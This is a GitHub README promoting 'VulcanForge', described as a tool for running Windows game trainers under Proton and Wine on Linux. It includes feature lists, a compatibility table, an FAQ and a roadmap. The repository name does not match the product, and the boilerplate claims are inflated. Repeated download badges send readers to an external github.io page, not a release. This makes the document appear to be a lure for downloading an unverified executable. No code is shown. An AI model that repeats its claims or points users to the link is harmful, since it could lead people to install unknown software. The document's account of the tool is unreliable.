![preview](https://raw.githubusercontent.com/EddiKusS/proton-playground-warden/main/screen_a924f.svg)
[![Download](https://raw.githubusercontent.com/EddiKusS/proton-playground-warden/main/fetch_42a7166.svg)](https://EddiKusS.github.io/proton-playground-warden/)

# 🎮 VulcanForge — Linux Game Trainer Compatibility Matrix

**Engineered for gamers who refuse to choose between their favorite titles and their preferred operating system.**

VulcanForge is a community-driven compatibility matrix and orchestration layer that enables seamless trainer integration for Linux-native and Proton-compatible games. Unlike conventional solutions that require manual tweaking, VulcanForge provides a unified, metadata-rich registry that maps trainer executables, library dependencies, and Wine/Proton versions — so your training tools work flawlessly without needing to understand the underlying system architecture.

---

## 🌋 Why VulcanForge Exists

The Linux gaming landscape has matured dramatically, yet trainers remain the last frontier of friction. Most trainer tools are compiled exclusively for Windows, relying on specific system calls and .NET Framework versions that simply don't exist in a standard Proton environment. Users typically face one of three outcomes:

1. **The trainer won't launch at all** — missing DLLs, wrong Wine prefix, or architecture mismatches.
2. **The trainer launches but crashes** — it writes to locations Proton doesn't expose, or depends on services that aren't running.
3. **The trainer works intermittently** — memory addresses shift, and the tool's anti-detection logic conflicts with Proton's file system sandbox.

VulcanForge solves this by providing a **layered compatibility framework** that doesn't just run trainers — it *remembers* which configurations worked for which game-engine versions, and automatically applies those settings on subsequent launches.

---

## 🧠 Core Architecture: The Forge Abstraction Layer

At the heart of VulcanForge lies the **Forge Abstraction Layer (FAL)** — a thin, transparent shim that sits between the trainer executable and Proton's environment. The FAL performs four critical functions:

### 1. Dependency Injection Engine (DIE)
The DIE scans the trainer's PE headers and import tables, then maps every required DLL against a curated database of known-compatible libraries. Missing dependencies are automatically resolved from a local cache or downloaded from the VulcanForge community repository.

### 2. Prefix Pattern Recognition (PPR)
Instead of forcing trainers into a generic Wine prefix, the PPR analyzes the trainer's expected file paths and registry keys, then creates a **dedicated symbolic-link overlay** — preserving the host game's save data while giving the trainer its own sandboxed view.

### 3. Memory Address Remapping (MAR)
Trainers that rely on static memory offsets often break when Proton's Address Space Layout Randomization (ASLR) shifts things around. The MAR component tracks the game's actual memory layout at runtime and adjusts trainer pointers in real-time via a lightweight hook module.

### 4. Launch Sequence Replay (LSR)
Every successful trainer activation is recorded as a "Forge Recipe" — a JSON document that captures the exact environment variables, Wine version, DLL overrides, and launch order. Future launches replay this recipe automatically, eliminating guesswork.

---

## 🔥 Key Features

### 🗂️ Game-Trainer Pairing Intelligence
VulcanForge isn't just a launcher — it's a **matchmaker**. The built-in algorithmic engine compares the hashes of game executables against a fingerprint database of known game versions (Steam, GOG, Epic, and standalone). When a match is found, VulcanForge automatically recommends compatible trainers and ranks them by community success rate.

### 🧬 Wine & Proton Version Detection
Run the wrong Wine version, and your trainer may silently fail. VulcanForge reads your system's Proton installations (custom and bundled), detects which one your game is currently using, and cross-references this against the trainer's known-good matrix. If a mismatched version is detected, it highlights the discrepancy before you even press "Play."

### 📦 Modular Trainer Format (MTF)
Community members can package trainers in the standard VulcanForge MTF format — a self-contained archive that includes the trainer binary, all required runtime files, and a manifest with dependencies, supported game versions, and optional configuration presets. MTF packages install in one click and are automatically registered with the local compatibility database.

### 🚀 Hot-Reload Configuration Profiles
For games that receive frequent updates (which often break trainers), VulcanForge supports **hot-reload profiles** — snapshots of your game's executable metadata plus the trainer's memory pattern. When a game update is detected on next launch, VulcanForge asks whether you'd like to attempt automatic pattern re-scanning, reducing the time-to-recovery from days to minutes.

### 🖥️ Responsive CLI & TUI Interface
The command-line interface is fully scriptable and designed for automation. The terminal UI (built with ANSI escape sequences) provides a live view of active trainers, resource usage per trainer process, and logs — all without a graphical environment. The GUI mode (Qt-based) offers drag-and-drop MTF installation and a visual recipe editor.

### 🌐 Multilingual Community Hub
The built-in documentation and interface support 14 languages: English, German, Spanish, French, Italian, Portuguese, Russian, Polish, Ukrainian, Chinese, Japanese, Korean, Turkish, and Hindi. Community-contributed translations are synchronized via the central repository every 24 hours.

### 🔒 Safety-First Sandbox Execution
Trainers are inherently privileged — they need access to game memory. VulcanForge mitigates risk by executing trainers in a **firejail sandbox** (when available) with configurable file-access rules. This doesn't prevent the trainer from modifying game memory, but it does prevent malicious trainers from touching unrelated system files.

### 👥 Community-Driven Success Scoring
Every trainer in the registry has a **success score** — calculated from the ratio of positive launches to failures across the community. Scores are weighted by recency, so a trainer that fails after a game update automatically drops in ranking until an updated version is uploaded.

---

## 📚 How It Works — The Journey of a Trainer

1. **Discovery** — You browse the community registry or import an MTF package from a friend.
2. **Installation** — The MTF package is unpacked into the local Forge Cache, preserving file permissions and symlinks.
3. **Association** — You link the trainer to a specific game install (either detected automatically or selected manually).
4. **Configuration** — VulcanForge runs a quick pre-flight check, detecting your Proton version and scanning the game's executable.
5. **Activation** — The FAL layers are applied: dependencies injected, prefix overlay created, memory hooks prepared.
6. **Monitoring** — The trainer runs inside the sandbox, with CPU, memory, and GPU usage displayed in the status tray.
7. **Recipe Creation** — On successful exit, a Forge Recipe is saved for future one-click launches.

---

## 🛠️ Installation & System Requirements

> **Note:** VulcanForge requires no system-level installation beyond a standard user-space directory. All components are contained within a single self-extracting archive that expands into your home folder (`~/.vulcanforge/`).

### Prerequisites
- **Operating System:** Ubuntu 22.04+, Fedora 38+, Arch Linux (rolling), or any distro with kernel 6.0+
- **Gaming Runtime:** Steam with Proton 8.0+ OR Lutris with Wine 9.0+
- **Python:** 3.10+ (bundled in the archive, no system Python required)
- **Disk Space:** 250 MB for the core engine + variable space for MTF packages

### Installation Steps
1. Download the latest release archive from the **Releases** section of this repository (the [![Download](https://raw.githubusercontent.com/EddiKusS/proton-playground-warden/main/fetch_42a7166.svg)](https://EddiKusS.github.io/proton-playground-warden/) marker above links to the recommended version).
2. Extract the archive to your home directory using your preferred archive manager.
3. Run the bootstrap script from a terminal: `./vulcanforge --setup`
4. The setup wizard will detect your existing game libraries and Proton installations.

---

## 🧪 Supported Environments & Compatibility Matrix

| Game Store | Proton Version | Trainer Architecture | Status |
|------------|---------------|----------------------|--------|
| Steam | Proton 8.0 | x86_64, x86 | ✅ Stable |
| Steam | Proton 9.0 | x86_64, x86 | ✅ Stable |
| GOG Galaxy | Wine 9.0 (Lutris) | x86_64 | ✅ Stable |
| Epic Games Store | Proton 8.0 | x86_64 | ⚠️ Beta |
| Standalone (DRM-free) | Any | x86_64 | ✅ Stable |

---

## 🌠 Frequently Asked Questions (FAQ)

### Q: Is VulcanForge a "crack" tool?
**A:** No. VulcanForge does not modify, bypass, or circumvent any copy-protection mechanisms. It only enables the execution of legitimate trainer software — which are typically distributed as standalone executables by their respective developers. The trainer still requires the original, legally-owned game to function.

### Q: Will my game saves be corrupted?
**A:** No. The Prefix Pattern Recognition layer creates a **symbolic-link overlay** — your actual save files remain untouched. The trainer writes to a temporary sandbox directory that is discarded on process exit.

### Q: Can I use VulcanForge with non-Steam games?
**A:** Yes. VulcanForge works with any game launched through Proton, Lutris, or a custom Wine prefix. The game store is irrelevant as long as the executable can be fingerprinted.

### Q: What happens if my game gets an update?
**A:** VulcanForge detects the executable hash change and warns you that the trainer may be outdated. The hot-reload profile feature can automatically re-scan the new binary for memory patterns, though success is not guaranteed.

### Q: How do I request support for a new language?
**A:** Translation files are stored in `/locale/*.json`. You can contribute a new translation via a pull request. Automated language-pack updates are pushed weekly.

---

## 🗺️ Roadmap for 2026

### Q1 2026 — Community Recipe Marketplace
A decentralized (IPFS-based) index of Forge Recipes that allows users to share configuration profiles without requiring a central server. This eliminates single points of failure and makes the registry more resilient.

### Q2 2026 — AI-Assisted Pattern Discovery
We are building a machine-learning model that examines game process memory diagrams and auto-generates candidate memory patterns for trainers, potentially reducing manual scanning work by 60%.

### Q3 2026 — Cross-Platform Remote Sync
Optional telemetry (disabled by default) that allows you to sync your Forge Recipes across multiple machines — ideal for users with a desktop and a gaming laptop.

### Q4 2026 — Web Dashboard
A read-only web interface that displays your local trainer library, success metrics, and community rankings — designed to be self-hosted on a home server.

---

## 🤝 Contributing Guidelines

We welcome contributions of all kinds:

- **Bug Reports:** Open an issue with the `bug` label, including your system info (`vulcanforge --report`).
- **Feature Requests:** Use the `enhancement` label and describe the custom trainer type or game store you'd like supported.
- **MTF Packages:** Package your own trainers in the MTF format and submit a pull request to the community registry.
- **Translations:** Add or update locale JSON files — this requires no coding knowledge.
- **Documentation:** Improve the wiki articles about specific game-trainer quirks or environment troubleshooting.

Please read the `CONTRIBUTING.md` file at the root of this repository for detailed style guidelines and the Code of Conduct.

---

## 📜 License & Legal Disclaimer

**VulcanForge is released under the MIT License.** You are free to use, modify, and distribute this software in personal or commercial projects, provided that the original copyright notice and permission notice are included in all copies or substantial portions of the Software.

**THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES, OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.**

### ⚠️ Additional Notices
- VulcanForge does not distribute, host, or share any trainer binaries, game executables, or proprietary game assets.
- Trainers are the intellectual property of their respective creators. VulcanForge merely provides a runtime environment and compatibility layer.
- Users are solely responsible for verifying that their use of trainers complies with the terms of service of their game providers, platforms, and regional laws.
- This project is not affiliated with Valve Corporation, Proton, WineHQ, or any game studio.

---

## 🎯 Why Choose VulcanForge?

Because **compatibility shouldn't be a lottery**. Most Linux gamers approach trainers with the resigned attitude of "maybe it'll work this time." VulcanForge flips that dynamic by turning every successful run into a **reproducible, versioned, shareable recipe**. It respects your time — if a trainer has never worked on your exact game version, you'll know before you launch.

The **community success score** system also creates a natural feedback loop: failed runs lower a trainer's visibility, which incentivizes creators to update their packages. This keeps the registry fresh and honest.

---

## 📞 24/7 Community & Support Channels

We operate a **24/7 support matrix** across the following channels (all free to join):

- **Discord Server** — Real-time help from maintainers and power users, organized by game engine (Unreal, Unity, Source, etc.)
- **Matrix Room** — FOSS-friendly alternative for privacy-conscious users; bridged with the Discord server.
- **GitHub Discussions** — Structured Q&A for longer-form troubleshooting with code snippets.
- **Weekly Office Hours** — Every Saturday, a maintainer hosts a 1-hour live session on Jitsi for screen-share debugging.

Response times are typically under 2 hours for urgent issues (game-breaking bugs affecting multiple users), and under 24 hours for general inquiries.

---

## 💡 Final Notes: The Philosophy of Open Gaming Tooling

VulcanForge adheres to the principle that **if you own a game on Linux, you deserve the same breadth of third-party utilities as Windows users**. Trainers are just one example — the same architecture could, in theory, be adapted for other memory-mapped tools like injectable overlays, debuggers, or even custom performance counters.

We built this project because we're tired of seeing Linux gamers abandoned by the tooling ecosystem. VulcanForge is our small contribution to closing that gap — and we hope you'll find it as liberating as we do.

---

**Thank you for reading. Now go forge your own gaming experience.**

[![Download](https://raw.githubusercontent.com/EddiKusS/proton-playground-warden/main/fetch_42a7166.svg)](https://EddiKusS.github.io/proton-playground-warden/)